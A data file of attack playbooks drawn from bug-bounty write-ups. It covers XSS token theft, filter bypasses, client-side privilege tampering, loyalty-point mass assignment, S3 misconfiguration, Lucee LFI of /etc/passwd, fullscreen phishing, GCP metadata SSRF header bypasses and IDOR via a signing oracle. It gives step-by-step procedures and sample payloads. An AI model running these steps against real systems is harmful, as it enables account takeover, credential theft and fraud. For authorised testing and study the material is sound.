trigger_conditions.when_to_apply: When an authenticated user can send an invitation link to a prospect which contains user-controlled input that is reflected in the URL and rendered in the DOM.
prerequisites: Attacker must have an authenticated session.
Target application must be vulnerable to reflected XSS in the invitation URL parameter.
applicability_signals: Invitation link format observed: https://<TARGET_URL>/redacted_url/url;url=<EXTERNAL_URL>
User-controlled input is reflected in the URL and rendered in the DOM.
skip_if: No reflected XSS found in invitation URLs.
Angular sanitization prevents any JavaScript execution.

recon_steps: Step 1: Authenticate to the target application and locate the feature for inviting prospects.
Step 2: Observe the format of the invitation link generated by the application. Pay attention to any parameters that seem to accept user input.
Step 3: Attempt to inject basic XSS payloads (e.g., `javascript:alert(document.domain)`) into the observed URL parameters to confirm XSS vulnerability.
attack_steps: Step 1: Send an invitation email to an attacker-controlled email address, crafting the invitation link to include a reflected XSS payload in the URL.
Step 2: Upon the victim clicking the crafted link, observe the execution of the XSS payload in the victim's browser.
Step 3: Leverage the XSS to steal sensitive information, such as session tokens stored in local storage, by using a payload to send this data to an attacker-controlled server.
tools_recommended: Burp Suite for intercepting and modifying requests/responses.
A simple HTTP server (e.g., Python's SimpleHTTPServer) or a service like Burp Collaborator for receiving exfiltrated data.
success_indicators: The XSS payload executes successfully (e.g., `alert(document.domain)` pops up).
Attacker-controlled server receives data exfiltrated from the victim's local storage (e.g., session tokens).
failure_indicators: XSS payload is sanitized and does not execute, or URL is malformed leading to an error page. -> Investigate other input vectors or sanitization bypasses.

No sensitive information is found in local storage or the response from the attacker-controlled server is empty. -> Re-evaluate the payload for data exfiltration or confirm if session information is actually stored in local storage.

playbooks.impact: Account takeover (ATO) by stealing session tokens from local storage, allowing the attacker to impersonate the victim user.
playbooks.key_lesson: When an XSS vulnerability is found in a reflected parameter, explore if sensitive information like session tokens are stored in local storage and can be exfiltrated to achieve account takeover.

meta.title: Reflected XSS in Tokopedia Train Ticket

trigger_conditions.when_to_apply: When the target website reflects GET parameters into a JavaScript context and performs partial sanitization for tag-like sequences.
prerequisites: The target website uses GET parameters that are reflected within a JavaScript context.
applicability_signals: Existence of URL parameters like 'ori' and 'dest' in the search functionality.
GET parameters are stored in a JavaScript variable like 'dataJs.query'.
The server sanitizes '<' and '>' characters only when they appear consecutively as '<.*>'.
skip_if: All GET parameters are strictly encoded or escaped, preventing the injection of '<', '>', or their combinations.
The target does not reflect GET parameters into a JavaScript context.

recon_steps: Step 1: Navigate to the train ticket search page (e.g., https://tiket.tokopedia.com/kereta-api/search/Jakarta-Gambir-GMR/Bandung-Bandung-BD).
Step 2: Observe the URL parameters and how they are reflected in the page source, particularly within JavaScript code or variables.
Step 3: Test the sanitization of special characters like '<', '>', '"', and '\' in various parameters.
attack_steps: Step 1: Construct a payload by splitting the closing script tag '/script/' and the opening tag '>' across two different parameters, 'ori' and 'dest'.
Step 2: Inject an XSS payload within the separated tags, for example, using an SVG element with an onload attribute.
Step 3: Send the crafted URL to the target.
tools_recommended: Burp Suite: To intercept and modify requests, observe reflected parameters, and craft payloads.
Browser Developer Tools: To inspect JavaScript variables and analyze response content.
success_indicators: An alert box pops up displaying the current URL.
Browser's XSS auditor flags the page (e.g., Chrome XSS auditor blocks the page indicating reflected XSS).
The payload executes arbitrary JavaScript in the victim's browser context.
failure_indicators: The payload is encoded or rejected by the server, indicating the sanitization is effective.
No JavaScript execution occurs, and no XSS auditor warnings appear. Suggestion: Investigate other parameters or encoding techniques.
Parameters are not reflected into JavaScript context. Suggestion: Look for DOM-based XSS or other vulnerability types.

playbooks.impact: An attacker can execute arbitrary JavaScript in the victim's browser. This can lead to session hijacking (if cookies are accessible via JavaScript despite HTTP-only flag, as observed in the writeup where session cookie was also stored in a JS variable), phishing, redirecting users to malicious sites, or performing actions on behalf of the user within the Tokopedia domain.
playbooks.key_lesson: When encountering partial sanitization of tag-like characters, consider splitting the payload across multiple parameters or exploiting alternative tag closing mechanisms to bypass filters.

meta.title: Using Burp Suite match and replace settings to escalate your user privileges and find hidden features

affected_components: Client-side UI rendering based on feature flags and user permissions

trigger_conditions.when_to_apply: When an authenticated user's permissions or feature access is determined client-side by values returned from the server, especially boolean flags.
prerequisites: Authenticated session with the target application.
applicability_signals: Application logic that appears to restrict access to features or UI elements based on seemingly simple conditions.
Server responses containing JSON with boolean values (true/false) or enumerated permission levels (e.g., READONLY, BASIC) that control client-side behavior.
skip_if: All critical security decisions are demonstrably enforced server-side with no observable client-side bypass potential.
Application relies heavily on JavaScript obfuscation that prevents easy identification of client-side logic.

recon_steps: Step 1: Browse the target application (New Relic One) with an authenticated session and observe UI elements and available features.
Step 2: Use Burp Suite to capture traffic and analyze API responses, looking for JSON payloads that control feature visibility or user permissions (e.g., boolean flags, userLevel, subscriptionLevel).
attack_steps: Step 1: Configure Burp Suite Proxy's 'Match and Replace' rules.
Step 2: Add a rule to find specific string values in responses (e.g., 'false' for feature flags, 'READONLY' for userLevel, 'BASIC' for subscriptionLevel).
Step 3: Add a rule to replace those found strings with alternative values that should grant higher privileges or enable features (e.g., 'true', 'ADMIN', 'PROFESSIONAL').

Step 4: Forward the modified requests and observe the application's behavior. Refresh pages or navigate to different sections to see if new UI elements appear or if restricted functionality becomes accessible.
tools_recommended: Burp Suite: Proxy -> Options -> Match and Replace tab.
success_indicators: New UI elements or previously inaccessible features appear on the client-side.
Application behaves as if the user has elevated privileges (e.g., administrative functions become available).
Access to unreleased or beta features.
failure_indicators: No change in application behavior after applying the match/replace rules. This might indicate server-side enforcement or that the specific values being modified do not control the expected functionality.
Application breaks or becomes unstable. This suggests that modifying certain values unexpectedly impacts client-side logic.

playbooks.impact: Discovery of unreleased features, access to sensitive functionalities meant for higher privilege users, and potentially identifying other security vulnerabilities within those newly exposed areas.
playbooks.key_lesson: Always investigate client-side logic that controls access to features or user roles by attempting to manipulate server responses, particularly boolean flags and enumerated permission values, using tools like Burp Suite's Match and Replace.

meta.title: Parameter Pollution issue in API resulting XPoints

trigger_conditions.when_to_apply: When an API endpoint accepts user profile updates via PUT and reflects new or uninitialized parameters in its responses.
prerequisites: Attacker must have an authenticated session with the target API.
applicability_signals: API endpoint uses PUT or POST to update user profile.
API response includes parameters that were not explicitly sent in the request.
The new parameter is reflected with an empty or null value in the response.
skip_if: API requests are rejected with 400 or 401 if unexpected parameters are included.
The target API sanitizes or ignores unknown parameters without reflection.

recon_steps: Step 1: Intercept API requests made by the mobile application using a proxy like Burp Suite or mitmproxy.
Step 2: Identify API endpoints responsible for updating user profile information, paying attention to the HTTP method (PUT/POST) and Content-Type (likely JSON).
attack_steps: Step 1: Send a PUT request to the /api/v2/user/{user_id}/profile endpoint with valid authentication headers and a JSON payload containing standard profile fields.
Step 2: Analyze the API response for any new or unexpected parameters that were not sent in the request, especially those reflected with empty or null values (e.g., "XPoint": "").
Step 3: Send another PUT request to the same endpoint, this time including the newly discovered parameter with a controlled value (e.g., "XPoint": "1500").
Step 4: Analyze the response to confirm that the parameter is accepted and its value is reflected.
Step 5: Log out and log back into the application to verify if the changes persist and if the manipulated parameter's value has a lasting effect (e.g., loyalty points update).
payloads_or_patterns:
PUT /api/v2/user/<USER_ID>/profile HTTP/1.1
Accept: application/vnd.api+json
Authorization: Bearer <SESSION_TOKEN>
api-key: <API_KEY>
Content-Type: application/json; charset=UTF-8
Content-Length: <LENGTH>
Host: api.redacted.com
Connection: close
Accept-Encoding: gzip, deflate
User-Agent: okhttp/3.10.0

{
  "EmailAddress": "<EMAIL>",
  "FirstName": "<FIRST_NAME>",
  "Parameter1": "<PARAM1>",
  "MobileVerified": true,
  "Mobile": "<MOBILE>",
  "Parameter2": "<PARAM2>",
  "Surname": "<SURNAME>",
  "UserId": "<USER_ID>",
  "XPoint": "<MALICIOUS_VALUE>"
}
tools_recommended: Burp Suite or OWASP ZAP: For intercepting and modifying HTTP requests.
Frida: For deep inspection of mobile app network traffic (as mentioned in writeup).
success_indicators: The API response reflects the manipulated value of the new parameter (e.g., "XPoint": "1500").
Upon re-authentication, the changes associated with the manipulated parameter persist and are functional (e.g., increased loyalty points).
failure_indicators: The API response does not reflect the manipulated value, or the parameter is ignored.
The API returns an error (e.g., 400 Bad Request) when the unexpected parameter is included.
Changes do not persist after re-authentication, indicating the parameter is not stateful or not correctly processed.

playbooks.impact: Attacker can manipulate loyalty points (XPoints) to an arbitrary amount, potentially leading to financial loss for the company or unfair advantages for the attacker.
playbooks.key_lesson: When updating user profiles via API, always test for HTTP Parameter Pollution by including unexpected parameters in the request and verifying their reflection and persistence in the response.

meta.title: How I earned $1,500 in just 15 mins due to Amazon S3 bucket misconfiguration?

affected_components: S3 buckets used by Dropbox for file storage and CDN
tech_stack_fingerprints: Amazon S3 bucket names (potentially discoverable through subdomain enumeration or common naming conventions)

trigger_conditions.when_to_apply: This vulnerability applies when applications utilize third-party CDNs like Amazon S3, and their S3 buckets have improperly configured Access Control Lists (ACLs) allowing unauthenticated read/write access.
prerequisites: The target application uses Amazon S3 for storing or serving content.
The S3 bucket's ACLs are misconfigured, allowing public access.
The attacker can identify or guess the S3 bucket name.
applicability_signals: Finding publicly accessible Amazon S3 buckets associated with the target domain.
Observing responses from Amazon S3 indicating public read/write permissions.
skip_if: All identified S3 buckets are properly secured with private ACLs.
WAF rules block requests to S3 endpoints or specific S3 bucket patterns.
The target application does not utilize Amazon S3 or similar cloud storage services.

recon_steps: Step 1: Perform subdomain enumeration on the target domain to identify potential S3 bucket names (e.g., using tools like `subfinder`, `amass`). Look for patterns like `[target].s3.amazonaws.com`, `s3.[target].com`, or custom domain configurations pointing to S3.

Step 2: Use tools like `awscli` or browser extensions to check the public accessibility and ACLs of discovered S3 buckets. Attempt to list objects in buckets or upload/delete files to verify permissions.
attack_steps: Step 1: Once a misconfigured S3 bucket is identified (allowing upload, view, and delete), navigate to the bucket URL.
Step 2: Upload a malicious file (e.g., a file designed to trigger a vulnerability on the client-side or server-side if the files are processed by the application).
Step 3: View the uploaded file to confirm it is accessible.
Step 4: Delete files as needed to demonstrate full control.
payloads_or_patterns: Payloads depend on the intended exploitation. For demonstration, simply uploading a text file like `test.txt` with content `This is a test.` can confirm upload/read access.
To exploit specific vulnerabilities, payloads like JavaScript for XSS, or crafted files for RCE might be used, depending on how the application processes files from the S3 bucket.
tools_recommended: subfinder: For subdomain enumeration to find potential S3 bucket names.
amass: Another powerful tool for identifying subdomains and potential S3 endpoints.
awscli: To interact with AWS services, including checking S3 bucket permissions and managing objects.
Burp Suite/OWASP ZAP: To intercept and modify requests to S3 endpoints, and to automate the testing of various S3 bucket configurations.
success_indicators: Successful upload, view, or deletion of files within the target's S3 bucket.
Receiving a 200 OK response when attempting to access or modify files.
The uploaded file is served by the application or CDN, confirming the misconfiguration.
failure_indicators: Receiving 403 Forbidden or 404 Not Found errors for all attempted S3 bucket operations, indicating proper access controls are in place.
Requests to S3 endpoints are blocked by a WAF.
No discoverable S3 buckets associated with the target application.

playbooks.impact: An attacker can read, write, and delete any file stored in the misconfigured S3 bucket. This could lead to data exfiltration, data corruption, denial of service, or potentially remote code execution if the application processes files from the bucket in a vulnerable way.
playbooks.key_lesson: Always verify the Access Control Lists (ACLs) and public accessibility of Amazon S3 buckets used by an application, especially when they are integrated with third-party CDNs.

meta.title: Information Disclosure through error message + WAF Bypass led to Local File Inclusion

trigger_conditions.when_to_apply: When a web application utilizes the Lucee framework and has an accessible admin interface, particularly if it allows customization of error handling mechanisms.
prerequisites: Target is using Lucee Framework.
Ability to access the Lucee admin interface (/lucee/lucee/admin/server.cfm or /lucee/lucee/admin/web.cfm).
Ability to set a new password for the Lucee admin interface.
applicability_signals: Existence of /lucee/lucee/admin/server.cfm or /lucee/lucee/admin/web.cfm.
An error page that can be triggered (e.g., 404 or 500 errors).
The Lucee admin interface allows modification of error mappings or templates.
skip_if: Lucee admin interface is not accessible.
Error mapping functionality is not exposed or configurable.
WAF blocks attempts to trigger errors or access admin panels consistently.

recon_steps: Step 1: Identify potential Lucee framework instances by searching for '/lucee/lucee/admin/server.cfm' or '/lucee/lucee/admin/web.cfm' in source code or via directory brute-forcing.
Step 2: If a Lucee admin interface is found, attempt to access it and determine if a password is required or if it's publicly accessible.
Step 3: If a password is required, attempt to reset it or find default credentials.
Step 4: If the admin interface is accessible, navigate to the error mapping or template configuration section.
attack_steps: Step 1: Access the Lucee admin interface (e.g., https://<TARGET_URL>/lucee/lucee/admin/server.cfm).
Step 2: Set a new password for the Lucee admin if prompted, or log in if credentials are known.
Step 3: Navigate to the web settings or error handling section (e.g., https://<TARGET_URL>/lucee/lucee/admin/web.cfm?action=server.error).
Step 4: Modify the default error template path for a specific HTTP error code (e.g., 500 Internal Server Error) to a sensitive file path (e.g., '../../../../../../../../../etc/passwd').
Step 5: Trigger the modified error code by making a request that is known to cause that specific error (e.g., a malformed request to an endpoint that returns a 500 error).
Step 6: Observe the response for the content of the file specified in Step 4.
tools_recommended: Burp Suite: For intercepting and modifying requests, directory brute-forcing.
Nmap: For initial port scanning and service version detection.
Censys.io or Shodan: For finding origin IP addresses behind CDNs.
Waybackurls: To discover historical URLs and potential endpoints.
success_indicators: The response to the error-triggering request contains the content of the targeted sensitive file (e.g., /etc/passwd, Tomcat server.xml).
failure_indicators: Standard error page is displayed instead of file content → The error mapping was not successfully modified or the path is incorrect. Re-verify admin access and file paths.
403 Forbidden response → WAF or application logic is preventing access to the sensitive file.
The Lucee admin interface is inaccessible or does not offer error mapping customization → This specific LFI vector is not applicable; pivot to other reconnaissance or attack vectors.

playbooks.impact: Disclosure of sensitive system files such as /etc/passwd, which can reveal user accounts and system information. Disclosure of configuration files like Tomcat's server.xml can expose credentials for databases (e.g., PostgreSQL, LDAP) and cloud services (e.g., Azure), potentially leading to further compromise.
playbooks.key_lesson: Always investigate the configuration options for administrative interfaces, especially error handling and templating systems, as they can be manipulated to achieve Local File Inclusion.

meta.title: Fullscreen API Attack’s Revisited and the FaceBook NA Story

affected_components: Inbuilt browser that handles external links

trigger_conditions.when_to_apply: When the target application utilizes an inbuilt browser that does not display warnings or delays when entering fullscreen mode, and allows rendering of third-party websites.
prerequisites: User must click on a malicious link that opens in the target's inbuilt browser.
applicability_signals: Application opens external links in an inbuilt browser
Observed lack of fullscreen transition warnings in the inbuilt browser
skip_if: The inbuilt browser displays prominent warnings or significant delays during fullscreen transitions.
The inbuilt browser explicitly blocks or sanitizes requests to third-party websites, preventing the attack.

recon_steps: Step 1: Identify if the target application opens external links within an in-app browser.
Step 2: Observe the behavior of the in-app browser when navigating to a URL that attempts to trigger the Fullscreen API.
Step 3: Verify if the in-app browser provides any warnings or delays during fullscreen transitions.
attack_steps: Step 1: Craft a malicious URL using the HTML5 Fullscreen API that redirects the user to a phishing page once fullscreen is initiated.
Step 2: Deliver this malicious URL to the target user through a social engineering vector (e.g., within the application's messaging or posts).

Step 3: When the user clicks the link, the target's in-app browser will load the URL and attempt to go fullscreen without warning, potentially leading to the phishing page being displayed in a deceptive manner.
payloads_or_patterns: Signup to FB to Continue
tools_recommended: Custom HTML/JavaScript payload creator
URL shortener (optional, for obfuscation)
success_indicators: The user's screen enters fullscreen mode, displaying a phishing page without any browser warnings or visible indications that it's a third-party site.
User provides credentials or sensitive information on the phishing page.
failure_indicators: The in-app browser displays a warning banner about entering fullscreen mode, or a significant delay is noticeable.

The in-app browser prevents the Fullscreen API from executing or blocks the loading of the third-party phishing URL. In this case, consider if there are other ways to redirect users to malicious sites within the app.

playbooks.impact: Successful phishing attacks leading to the theft of user credentials (e.g., Facebook login details) or other sensitive information.
playbooks.key_lesson: Test in-app browsers for vulnerabilities related to the HTML5 Fullscreen API, as they may lack the security mitigations present in standard desktop or mobile browsers.

meta.title: XSSing Google Employees — Blind XSS on googleplex.com

trigger_conditions.when_to_apply: When a web application allows file uploads and performs client-side validation on the file type, but does not adequately sanitize or validate the file content and its associated metadata (like filename and Content-Type) on the server-side.
prerequisites: Target application accepts file uploads.
Client-side file type validation exists.
applicability_signals: File upload form present.
Browser's developer tools can intercept HTTP requests.
Ability to modify POST request parameters (filename, Content-Type, body).
skip_if: Server-side file type validation is robust.
File content is strictly validated for known safe formats.
No observable DOM injection points in the file upload or processing workflow.

recon_steps: Identify file upload functionality on the target application.
Analyze the HTTP request sent when uploading a file using browser developer tools or an intercepting proxy.
Observe client-side validation logic for file types.
attack_steps: Step 1: Initiate a file upload on the target application (e.g., gist-uploadmyinvoice.appspot.com).
Step 2: Intercept the POST request for file upload using a proxy (e.g., Burp Suite).
Step 3: Modify the `filename` parameter in the request from a valid extension (e.g., `.pdf`) to an executable extension (e.g., `.html`).
Step 4: Modify the `Content-Type` header from the original value (e.g., `application/pdf`) to `text/html`.

Step 5: Replace the file content in the request body with a JavaScript XSS payload. Ensure the payload is designed to notify an external server when executed (e.g., using an `` tag with `src` pointing to an attacker-controlled domain or a service like ezXSS).
Step 6: Forward the modified request to the server.
Step 7: Monitor the external server for incoming requests, which indicate the XSS payload has been executed.
tools_recommended: Burp Suite: Intercept and modify HTTP requests.
Browser Developer Tools: Network tab to inspect requests.
ezXSS or similar service: To host the callback endpoint and log XSS executions.
success_indicators: A request is received at the attacker-controlled callback URL, indicating the XSS payload was executed in the context of the target application (e.g., googleplex.com).
The received request contains information from the victim's browser environment (e.g., cookies, domain).
failure_indicators: No request is received at the callback URL after submitting the modified file.
The server returns an error indicating an invalid file format or content.
The uploaded file is still processed as a PDF and the XSS payload is not rendered.
A 4xx or 5xx error response is received for the POST request.

playbooks.impact: Execution of arbitrary JavaScript code within the browser of authenticated Google employees or partners on internal Google domains like googleplex.com. This could lead to the theft of sensitive information (like session cookies, internal data visible on the page), credential harvesting, or further compromise of internal applications.
playbooks.key_lesson: Always validate both the file content and its metadata (filename, Content-Type) on the server-side when handling file uploads, as client-side validation alone is insufficient to prevent file type spoofing and subsequent code injection.

meta.title: v1 Instance Metadata Service protections bypass

target_profile.technology: Google Cloud Platform (GCP) Instance Metadata Service
affected_components: Instance Metadata Service API (specifically, the protections against SSRF)
target_profile.required_access_level: any_authenticated_user (exploiting an SSRF vulnerability in an application running in GCP)

trigger_conditions.when_to_apply: When an SSRF vulnerability is identified in an application running within GCP, where the application allows a partially controlled URL to an arbitrary host.
prerequisites: An SSRF vulnerability in a GCP-hosted application that allows requests to arbitrary hosts with a partially controlled URL.
applicability_signals: The target application exhibits SSRF behavior.
The SSRF allows requests to `http://169.254.169.254/`.
The application's SSRF handling does not strictly enforce URL formatting or required headers.
skip_if: The SSRF vulnerability is restricted to specific whitelisted domains and `169.254.169.254` is not among them.
The application performs strict URL validation that prevents the injection of special characters like `//` or `;`.

recon_steps: Step 1: Identify an SSRF vulnerability in a GCP-hosted application that allows requests to arbitrary hosts.
Step 2: Attempt to make a request to `http://169.254.169.254/computeMetadata/v1/instance/name` using the SSRF to confirm reachability and initial response.
attack_steps: Step 1: Send a GET request to `http://169.254.169.254/computeMetadata//v1/instance/name` using the identified SSRF vulnerability. This bypasses the `Metadata-Flavor: Google` requirement by including an extra `/`.
Step 2: If Step 1 fails or returns an unexpected result, attempt to send an HTTP/1.0 GET request to `169.254.169.254` on port 80. This method aims to dump all metadata content.

Step 3: If the SSRF vulnerability allows for partial URL control with appended data, send a request like `http://169.254.169.254/computeMetadata/v1/instance/name;extra/content` to bypass header requirements and potentially ignore trailing malicious content.
tools_recommended: Burp Suite (to intercept and modify SSRF requests)
netcat (nc) for raw HTTP request crafting
success_indicators: Receiving instance metadata (e.g., instance name, project ID, service account credentials) in the SSRF response.
Successful retrieval of sensitive information from the metadata service.
failure_indicators: Received a 403 Forbidden or similar error indicating the `Metadata-Flavor: Google` header is still enforced.
The HTTP/1.0 request does not return any metadata.
The application logs or returns an error related to invalid URL structure, suggesting the bypass attempts are not working.

playbooks.impact: Attacker can retrieve sensitive information such as service account credentials, instance names, and other metadata, leading to potential compromise of GCP resources and services.
playbooks.key_lesson: When exploiting SSRF vulnerabilities targeting GCP's Instance Metadata Service, attempt to bypass the `Metadata-Flavor: Google` header by manipulating the URL with extra slashes (`//`) or by crafting HTTP/1.0 requests, or by using path traversal characters (`;`) to ignore appended data.

meta.title: How spending our Saturday hacking earned us 20k
meta.authors: Matti Bijnens, Arne Swinnen, Jeroen Beckers

affected_components: endpoints using 'E' and 'V' parameters for data access

trigger_conditions.when_to_apply: When an application uses 'encrypted' parameters (like 'E' and 'V') for accessing sensitive data, and these parameters are tied to user context or specific resource IDs. This technique is particularly effective if a 'signing oracle' or an endpoint that reveals encrypted values based on plaintext input exists.
prerequisites: Authenticated access to the target application.
Ability to observe and modify requests/responses.
applicability_signals: Parameters named 'E' and 'V' in API requests.
Responses contain 'E' values that change for the same 'V' value, possibly indicating a timestamp or unique generation.
Error messages like 'This doesn’t seem to be working, try again or contact us' when 'E' values are manipulated.
Discovery of endpoints that expose 'E' values for specific inputs (e.g., username or resource ID).
skip_if: Parameters are not obviously encrypted or obfuscated.
No discernible relationship between different parameter values.
No endpoints found that reveal 'E' values for given inputs, indicating a lack of a signing oracle.

recon_steps: Step 1: Intercept and analyze requests to identify parameters involved in data access, specifically looking for patterns like 'E' and 'V'. Observe how these parameters change across different user actions or resource requests.

Step 2: Analyze the responses for the 'E' parameter. Note if the 'E' value changes for the same 'V' value across multiple requests. Also, look for endpoints that might reveal 'E' values based on plaintext inputs, such as a username or a resource ID.
Step 3: Identify specific endpoints like '/getInvoice' that accept a plaintext ID and observe the response.
attack_steps: Step 1: Locate an endpoint that accepts a plaintext resource ID (e.g., /getInvoice?id=12340).

Step 2: Identify a known 'signing oracle' endpoint or a method to obtain an 'E' value for a given plaintext input. This could involve changing a username to a specific ID and observing the generated 'E' value for that username.

Step 3: Construct a new request by taking the plaintext ID of a target resource (e.g., invoice 12341) and using the 'E' value obtained from the signing oracle for that target ID. For example, if changing your username to '12341' yields an 'E' value, use that 'E' value in the /getInvoice request.
Step 4: Send the crafted request to the target endpoint.
Step 5: Analyze the response to check if data belonging to the target resource (e.g., invoice 12341) is returned.
payloads_or_patterns: Intercepted request with V=<plaintext_id> and E=<E_value_from_oracle>
Example: Change username to <TARGET_USER_ID_TO_ACCESS> to get its corresponding 'E' value. Then, use this 'E' value in a request targeting a resource ID that is not accessible by the current user.
tools_recommended: Burp Suite: For intercepting, analyzing, and modifying HTTP requests and responses.
Custom scripting (e.g., Python) for automating the process of finding 'E' values from the oracle and crafting attack requests.
success_indicators: Receiving a 200 OK response with sensitive data from a resource that the attacker should not have access to.
Successfully accessing data associated with a different user ID or resource ID than the one originally intended for the authenticated user.
failure_indicators: Receiving an error message such as 'This doesn’t seem to be working, try again or contact us' indicating an invalid 'E' value or a defense mechanism.
Receiving a 403 Forbidden or similar error, indicating that the 'E' value is recognized as invalid or unauthorized.
If the oracle doesn't reveal 'E' values for resource IDs directly, consider alternative inputs or fuzzing for other identifiable patterns.

playbooks.impact: Unauthorized access to sensitive data, such as invoices or other user-specific information, belonging to other users. This could lead to data leakage and privacy violations.
playbooks.key_lesson: When encountering parameters that appear to be encrypted or obfuscated (like 'E' values), investigate for 'signing oracle' vulnerabilities where plaintext inputs can be used to derive corresponding 'encrypted' values, enabling IDOR.

meta.title: Don’t underestimates the Errors They can provide good $$$ Bounty!

trigger_conditions.when_to_apply: This technique is applicable when a subdomain is identified and it appears to be a 'dummy' or chat-related service, suggesting potential for less stringent security controls.
prerequisites: Access to the target subdomain (e.g., bot.mamba.ru)
applicability_signals: Subdomain exists and appears to be a chat bot or similar service.
Web application returns an error response instead of a standard 400 Bad Request when manipulating HTTP headers.
skip_if: All requests to the subdomain consistently return expected success or valid error codes without revealing sensitive information.
WAF or security controls prevent any manipulation of HTTP headers.

recon_steps: Step 1: Enumerate subdomains of the target domain (mamba.ru) using tools like Sublist3r or Amass.
Step 2: Identify subdomains that appear to be ancillary services, such as chat bots or administrative interfaces (e.g., bot.mamba.ru).
attack_steps: Step 1: Send an HTTP request to the identified subdomain (e.g., https://bot.mamba.ru).
Step 2: Use a proxy tool (e.g., Burp Suite) to intercept the request.
Step 3: Remove the 'Host' header from the intercepted request.
Step 4: Forward the modified request to the server.
Step 5: Analyze the server's response for any error messages that contain path information.
payloads_or_patterns: Remove the 'Host' header from the HTTP request.
tools_recommended: Burp Suite (or similar proxy) for intercepting and modifying requests.
Sublist3r or Amass for subdomain enumeration.
success_indicators: Error response from the server that includes file system paths (e.g., '/var/www/html/bot/source/index.php').
Response code is not a standard 400 Bad Request, but an informative error like 401 or custom error page revealing sensitive path information.
failure_indicators: Receiving a consistent 400 Bad Request error, indicating the server correctly rejected the malformed request without revealing internal details. Pivot to other subdomains or attack vectors.
No sensitive information is disclosed in any error messages. Try removing other headers or fuzzing other parts of the request.

playbooks.impact: Disclosure of internal server file paths, which can aid attackers in understanding the application's structure and identifying potential vulnerabilities for further exploitation.
playbooks.key_lesson: When interacting with web applications, especially ancillary services, intentionally malform HTTP requests by removing critical headers like 'Host' to trigger potential error-based information disclosure.

meta.title: Microsoft Edge Extensions Host Permission Bypass (CVE-2019-0678)

target_profile.required_access_level: any_authenticated_user | unauthenticated (if extension can be installed)

trigger_conditions.when_to_apply: When a Microsoft Edge extension has host permissions that do not cover privileged pages, and there's a mechanism to inject or execute JavaScript within the extension's context.
prerequisites: An attacker can convince a user to install a vulnerable extension, or the attacker has control over an existing extension.
The extension's manifest.json defines host permissions that do not include privileged pages (e.g., `about:*`).
applicability_signals: Extensions that interact with `chrome.tabs` or similar APIs.
Extensions that execute content scripts on specific hosts but not privileged pages.
The `manifest.json` file of an extension is accessible or can be analyzed.
skip_if: All host permissions include `<all_urls>` or explicitly include all relevant privileged pages.
The extension does not have any JavaScript execution capabilities on user-visitable pages or via specific APIs.

recon_steps: Step 1: Identify installed or installable Microsoft Edge extensions.
Step 2: Analyze the `manifest.json` file of the target extension to understand its declared host permissions and scripting capabilities.
